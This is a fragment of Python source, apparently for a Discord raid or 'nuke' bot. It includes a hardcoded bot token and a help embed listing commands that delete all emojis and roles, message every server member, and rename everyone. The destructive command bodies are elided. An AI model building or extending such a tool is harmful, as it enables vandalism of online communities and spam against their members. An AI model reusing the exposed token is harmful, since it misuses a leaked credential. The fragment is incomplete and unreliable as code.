...
token = "ODY2NTg1MTE4NjY3NzAyMjky.YPUsSA.LRL5Yz8MAlPkfz5avkIEOBKLHhw"
...
async def cmdhelp(ctx):
    ...
    await asyncio.sleep(0)
    try:
            embed = discord.Embed(title="Made By Obama's Step Son#1557", description="Commands: \n \n .cyberemojimoji (deletes all emojis) \n **.cyberteam (main command)** \n .cybermessage (messages everyone in the server)  \n .cyberrole (deletes all roles) \n .cyberrename (renames everyone to whatever you specify) " , color=discord.Colour.purple())
